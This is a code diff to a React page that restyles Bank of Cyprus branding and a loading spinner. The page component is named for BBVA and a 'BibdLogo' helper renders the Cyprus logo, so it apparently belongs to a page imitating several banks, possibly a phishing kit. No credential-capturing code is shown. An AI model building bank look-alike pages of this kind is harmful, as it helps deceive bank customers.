@@ -57,19 +57,39 @@ function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
   )
 }
 
-// Bank of Cyprus Brand Logo (matching uploaded screenshot)
-function BocLogo({ className = "h-7 sm:h-8" }: { className?: string }) {
+// Bank of Cyprus Brand Logo with text & emblem
+function BocBrandLogo({
+  iconSize = "w-[24px] h-[24px] sm:w-[26px] sm:h-[26px]",
+  textSize = "text-[13.5px] sm:text-[14.5px]",
+  className = "",
+}: {
+  iconSize?: string
+  textSize?: string
+  className?: string
+}) {
   return (
-    <img
-      src="/boc_logo.png"
-      alt="Bank of Cyprus"
-      className={`w-auto object-contain select-none pointer-events-none ${className}`}
-    />
+    <div className={`flex items-center gap-1.5 select-none ${className}`}>
+      <span
+        className={`text-[#058998] font-serif font-bold tracking-tight leading-none select-none ${textSize}`}
+        style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+      >
+        Bank of Cyprus
+      </span>
+      <img
+        src="/boc_logo.png"
+        alt="Bank of Cyprus"
+        className={`object-contain select-none pointer-events-none rounded-[4px] shrink-0 ${iconSize}`}
+      />
+    </div>
   )
 }
 
+function BocLogo({ className }: { className?: string }) {
+  return <BocBrandLogo className={className} />
+}
+
 function BibdLogo({ className }: { className?: string }) {
-  return <BocLogo className={className} />
+  return <BocBrandLogo className={className} />
 }
 
 type ScreenType =
@@ -815,12 +835,24 @@ export default function BbvaPage(props: any) {
           }}
           className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-white px-6 select-none cursor-pointer"
         >
-          <div className="flex flex-col items-center justify-center space-y-7">
-            {/* Bank of Cyprus Logo */}
-            <BocLogo className="h-10 sm:h-12" />
+          <div className="flex flex-col items-center justify-center space-y-6">
+            {/* Bank of Cyprus Logo & Text */}
+            <div className="flex flex-col items-center justify-center gap-3 select-none">
+              <img
+                src="/boc_logo.png"
+                alt="Bank of Cyprus"
+                className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl shadow-md object-contain"
+              />
+              <span
+                className="text-[#058998] font-serif font-bold text-[21px] sm:text-[23px] tracking-tight leading-none"
+                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+              >
+                Bank of Cyprus
+              </span>
+            </div>
 
             {/* Spinner */}
-            <div className="w-9 h-9 rounded-full border-[3.5px] border-[#058998]/20 border-t-[#058998] animate-spin" />
+            <div className="w-8 h-8 rounded-full border-[3px] border-[#058998]/20 border-t-[#058998] animate-spin" />
           </div>
         </main>
       )}
